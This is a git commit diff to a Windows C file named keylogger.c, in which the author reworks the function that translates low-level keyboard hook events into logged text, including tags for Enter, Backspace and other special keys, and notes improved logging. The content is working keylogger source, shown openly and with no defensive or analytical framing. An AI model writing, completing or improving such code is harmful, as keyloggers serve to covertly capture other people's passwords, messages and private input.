c3a96bead0cb6364ab24a074a671092969c44d66
CheychouJunior <cheychoumouafo@gmail.com>
2025-02-11 08:01:28 +0100

    The problem of backspace showing non printable characters is corrected, And the logging is further improved

--- keylogger.c
+++ keylogger.c
@@ -12,47 +12,49 @@ void logKeystroke(char *key){
 }
 
 // Function to get the character from the virtual key code
-char *getCharFromKey(char *keyName, WPARAM wParam, LPARAM lParam){
+void getCharFromKey(char *keyName, WPARAM wParam, LPARAM lParam){
     KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT *)lParam;
     DWORD vkCode = kbStruct->vkCode;
-    
-    // Get keyboard state
-    BYTE keyboardState[256];
-    GetKeyboardState(keyboardState);
-    
-    // Convert virtual key to character
-    WORD character;
-    int result = ToAscii(vkCode, kbStruct->scanCode, keyboardState, &character, 0);
 
-    if(result == 1){
-        // printable character
-        keyName[0] = character;
-        keyName[1] = '\0';
-        return keyName;
-    }else{
-        // Special keys
-        switch(vkCode){
-            case VK_RETURN: keyName[0] = '\n'; keyName[1] = '\0'; break;
-            case VK_SPACE:  keyName[0] = ' '; keyName[1] = '\0'; break;
-            case VK_BACK:   strcpy(keyName,"[BACK]"); break;
-            case VK_TAB:    strcpy(keyName,"[TAB]"); break;
-            case VK_SHIFT:   
-            case VK_LSHIFT:  
-            case VK_RSHIFT: strcpy(keyName,"[SHIFT]"); break;
-            case VK_CONTROL: 
-            case VK_LCONTROL: 
-            case VK_RCONTROL:   strcpy(keyName,"[CTRL]"); break;
-            case VK_ESCAPE: strcpy(keyName,"[ESC]"); break;
-            case VK_END:    strcpy(keyName,"[END]"); break;
-            case VK_HOME:   strcpy(keyName,"[HOME]"); break;
-            case VK_LEFT:   strcpy(keyName,"[LEFT]"); break;
-            case VK_UP: strcpy(keyName,"[UP]"); break;
-            case VK_RIGHT:  strcpy(keyName,"[RIGHT]"); break;
-            case VK_DOWN:   strcpy(keyName,"[DOWN]"); break;
-            default:    strcpy(keyName,"[ANOTHER]"); break;
-        }
-        return keyName;
+    // Handle special keys first
+    switch(vkCode){
+        case VK_RETURN: strcpy(keyName,"[ENTER]\n"); break;
+        case VK_SPACE:  strcpy(keyName," "); break;
+        case VK_BACK:   strcpy(keyName,"[BACK]"); break;
+        case VK_TAB:    strcpy(keyName,"[TAB]"); break;
+        case VK_SHIFT:   
+        case VK_LSHIFT:  
+        case VK_RSHIFT: strcpy(keyName,"[SHIFT]"); break;
+        case VK_CONTROL: 
+        case VK_LCONTROL: 
+        case VK_RCONTROL:   strcpy(keyName,"[CTRL]"); break;
+        case VK_ESCAPE: strcpy(keyName,"[ESC]"); break;
+        case VK_END:    strcpy(keyName,"[END]"); break;
+        case VK_HOME:   strcpy(keyName,"[HOME]"); break;
+        case VK_LEFT:   strcpy(keyName,"[LEFT]"); break;
+        case VK_UP: strcpy(keyName,"[UP]"); break;
+        case VK_RIGHT:  strcpy(keyName,"[RIGHT]"); break;
+        case VK_DOWN:   strcpy(keyName,"[DOWN]"); break;
+        default: {
+            // Get keyboard state
+            BYTE keyboardState[256];
+            GetKeyboardState(keyboardState);
+            
+            // Convert virtual key to character
+            WORD character;
+            int result = ToAscii(vkCode, kbStruct->scanCode, keyboardState, &character, 0);
+
+            if(result == 1){
+                // printable character
+                keyName[0] = (char)character;
+                keyName[1] = '\0';
+            }else{
+                // Unhandled key
+                strcpy(keyName,"[UNKNOWN]");
+            }
+        } 
     }
+
 }
 
 // Hook procedure to capture keystroke
